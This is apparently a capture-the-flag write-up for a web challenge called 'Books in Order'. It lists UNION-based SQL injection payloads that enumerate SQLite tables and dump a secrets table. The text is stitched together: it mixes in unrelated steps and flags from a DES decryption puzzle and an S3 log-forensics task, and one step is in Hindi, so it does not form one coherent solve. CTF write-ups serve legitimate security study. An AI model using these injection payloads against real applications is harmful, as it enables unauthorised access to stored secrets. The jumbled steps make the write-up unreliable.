# Books in Order – Web Challenge Writeup

## Metadata

- Category: `web`
- Source: `LPU-CYBERWAR-2K26/Writeups.txt` line 46
- Final Flag: `flag{SQL_1nj3ct10n_15_b4d_g46a00}`

## Challenge Summary

This writeup was reconstructed from your original notes and organized into a clean solve flow.

## Step-by-Step Solution

1. We find 7 coloumn
2. Now we enumerate tables:
3. We find secrets
4. We dump the data
5. Very weak only 56-bit key Used ECB mode (this mode is bad and easy to attack)
6. I just searchin the web and I found the key it was very easy
7. ciphertext = base64.b64decode("0twztnSUTZA6vaFHQwgJjSNymcnnMQctv40qp7mMkCoOvtiJPqLR45rWRVPnkIWoATOprxd5dnY=")
8. plaintext = cipher.decrypt(ciphertext)
9. Extract the zip
10. Expand-Archive -LiteralPath .\S3.zip -DestinationPath .\S3_extracted -Force
11. Pehle sirf object download events filter karo (REST.GET.OBJECT).
12. rg -n "REST.GET.OBJECT" .\S3_extracted\S3-Server-Logs
13. ... arn:aws:iam::764581110688:user/dev-neo ... REST.GET.OBJECT delevopers-ec2.pem ... 200 ...

## Commands / Evidence Snippets

```text
' UNION SELECT 1,2,3,4,5,6,7-- -
' AND 1=0 UNION SELECT 1,2,3,4,5,name,7 FROM sqlite_master WHERE type='table'-- -
' AND 1=0 UNION SELECT 1,2,3,4,5,group_concat(name,','),7 FROM pragma_table_info('secrets')-- -
' AND 1=0 UNION SELECT 1,2,3,4,5,group_concat(key||':'||value,'|'),7 FROM secrets-- -
admin_flag:flag{SQL_1nj3ct10n_15_b4d_g46a00}
from Crypto.Cipher import DES
flag{DES_cant_keep_secrets_when_the_key_is_weak!}
flag{devlopement-keys.pem_dev-neo}
Expand-Archive -LiteralPath .\S3.zip -DestinationPath .\S3_extracted -Force
rg -n "REST.GET.OBJECT" .\S3_extracted\S3-Server-Logs
```

## Analyst Notes

- Keep only validated artifacts in final answer.
- Prefer reproducible steps so this can be reused for similar CTF challenges.

## Final Flag

`flag{SQL_1nj3ct10n_15_b4d_g46a00}`
